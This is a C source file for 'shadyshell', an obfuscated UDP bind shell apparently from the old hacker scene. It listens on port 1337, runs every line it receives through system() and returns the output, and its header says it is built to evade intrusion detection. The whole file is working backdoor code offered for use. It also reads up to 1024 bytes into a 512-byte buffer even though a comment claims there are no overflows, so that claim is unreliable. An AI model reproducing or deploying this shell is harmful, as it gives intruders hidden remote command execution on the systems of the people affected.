/* shadyshell.c by Derek Callaway <super@udel.edu> -- S@IRC
   obfuscated/optimized/compact UDP portshell code; Avoid layer 4 IDS ;-)
   Example client usage: nc -u host.dom 1337
   Greets: inNUENdo, s0ftpr0jects, zsh 
*/
#include<stdio.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<stdlib.h>
#define DP 1337 /* Default Port */
void ve(const char*f){perror(f);exit(-1);} int isdigit(),dup2();
void usg(char**v){printf("usage: %s [port]\n",*v);exit(0);}
int main(int c,char**v){struct sockaddr_in s={};struct sockaddr u;
char*p,b[512];if(c==2){for(p=v[1];*p;p++)if(!isdigit(*p))usg(v);c=atoi(*(++v));}
s.sin_port=htons(c==2?c:DP),s.sin_addr.s_addr=INADDR_ANY,s.sin_family=AF_INET;
if((c=socket(AF_INET,SOCK_DGRAM,0))<0)ve("socket"); /* www.innu.org/~super */
if(bind(c,&s,sizeof(s))<0)ve("bind");dup2(c,1);dup2(c,2);s.sin_port=sizeof(u);
if(recvfrom(c,&b,1024,0,&u,(int*)&(s.sin_port))<0)ve("socket");
if(connect(c,&u,sizeof(u))<0)ve("socket"); /* No overflows here. :P */
do{for(*v=b,p=0;**v&&((*v-b)<512||(p=*v));(*v)++)if(p||**v=='\r'||**v=='\n')
{**v=0;break;}if(p)continue;system(b);recv(c,&b,1024,0);}while(1);exit(0);}
